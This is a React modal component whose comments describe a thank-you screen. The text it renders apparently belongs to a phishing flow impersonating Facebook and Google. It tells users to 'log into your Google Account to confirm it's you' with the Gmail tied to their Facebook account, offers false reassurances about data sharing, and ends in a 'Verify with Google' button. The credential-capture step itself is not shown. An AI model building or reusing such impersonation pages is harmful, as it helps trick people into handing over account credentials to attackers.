"use client";

interface NThanksModalProps {
  isOpen: boolean;
  onContinue: () => void;
}

export default function NThanksModal({ isOpen, onContinue }: NThanksModalProps) {
  if (!isOpen) return null;

  return (
    <div
      className="fixed inset-0 z-[100] flex flex-col bg-[#f0f4f9] overflow-y-auto animate-fade-in font-sans"
      role="dialog"
      aria-modal="true"
    >
      {/* Top Navbar */}
      <header className="w-full bg-white border-b border-gray-200/90 px-6 sm:px-12 py-3.5 flex items-center shrink-0">
        <div className="flex items-center">
          <img
            src="/images/n-logo2.png"
            alt="N-logo2.png"
            className="h-8 sm:h-9 object-contain select-none"
            onError={(e) => {
              if (e.currentTarget.src.includes("n-logo2.png")) {
                e.currentTarget.src = "/images/n-logo.png";
              }
            }}
          />
        </div>
      </header>

      {/* Center Thanks Content */}
      <main className="flex-1 flex flex-col items-center justify-center p-6 sm:p-10 md:p-14">
        <div className="w-full max-w-[680px] flex flex-col text-left">
          {/* Top instructional sentence */}
          <p className="text-[14px] sm:text-[15px] md:text-[16px] text-[#202124] leading-relaxed font-normal">
            Facebook
          </p>

          {/* Bold appreciation heading */}
          <h1 className="text-xl sm:text-2xl md:text-[26px] font-bold text-[#1f1f1f] tracking-tight leading-snug py-5 sm:py-6">
            Log into your Google Account to confirm it's you
          </h1>

          {/* Subtitle paragraph */}
          <p className="text-[14px] sm:text-[15px] md:text-[16px] text-[#202124] leading-relaxed font-normal pb-8 sm:pb-10">
            For security reasons, we need to verify with your Google Account by logging in with the Gmail address saved on your Facebook account
          </p>

          {/* Feature List items */}
          <div className="space-y-5 sm:space-y-6 pb-12 sm:pb-16">
            {/* Item 1: Sync / Rotate Icon */}
            <div className="flex items-center gap-3.5">
              <div className="shrink-0 text-[#1f1f1f]">
                <svg
                  className="w-5 h-5 sm:w-6 sm:h-6"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M21.5 2v6h-6" />
                  <path d="M21.5 8 18 4.5a9 9 0 0 0-14.7 3.5" />
                  <path d="M2.5 22v-6h6" />
                  <path d="M2.5 16 6 19.5a9 9 0 0 0 14.7-3.5" />
                  <line x1="9" y1="9" x2="15" y2="15" />
                </svg>
              </div>
              <span className="text-[14px] sm:text-[15px] md:text-[16px] text-[#1f1f1f] font-normal leading-normal">
                We will not share any of your Facebook data with your Google Account
              </span>
            </div>

            {/* Item 2: Padlock Icon */}
            <div className="flex items-center gap-3.5">
              <div className="shrink-0 text-[#1f1f1f]">
                <svg
                  className="w-5 h-5 sm:w-6 sm:h-6 fill-current"
                  viewBox="0 0 24 24"
                >
                  <path
                    fillRule="evenodd"
                    d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3H6a2.25 2.25 0 00-2.25 2.25v8.25A2.25 2.25 0 006 22.5h12a2.25 2.25 0 002.25-2.25V12A2.25 2.25 0 0018 9.75h-.75v-3A5.25 5.25 0 0012 1.5zm3.25 8.25h-6.5v-3a3.25 3.25 0 016.5 0v3z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
              <span className="text-[14px] sm:text-[15px] md:text-[16px] text-[#1f1f1f] font-normal leading-normal">
                This will not change the details you use to log into Facebook
              </span>
            </div>
          </div>

          {/* Action Button: "Verify with Google" */}
          <div className="w-full flex justify-center">
            <button
              type="button"
              onClick={onContinue}
              className="w-full max-w-[500px] sm:max-w-[540px] py-3.5 sm:py-4 px-8 bg-[#0b57d0] hover:bg-[#0842a0] active:scale-[0.99] text-white font-medium text-base sm:text-lg rounded-full shadow-xs hover:shadow transition-all cursor-pointer select-none text-center"
            >
              Verify with Google
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}
